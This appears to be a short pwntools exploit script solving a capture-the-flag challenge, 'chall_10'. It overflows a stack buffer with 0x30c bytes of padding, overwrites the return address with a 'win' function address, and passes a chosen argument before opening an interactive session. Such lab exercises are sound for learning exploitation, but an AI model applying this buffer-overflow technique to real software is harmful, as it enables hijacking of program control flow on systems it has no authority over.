from pwn import *

p = process('./chall_10')

winFunc = 0x080491d6
winFuncArg = 0x1a55fac3
payload = cyclic(0x308 + 0x4) + p32(winFunc) + cyclic(0x4) + p32(winFuncArg)

p.sendline(payload)
p.interactive()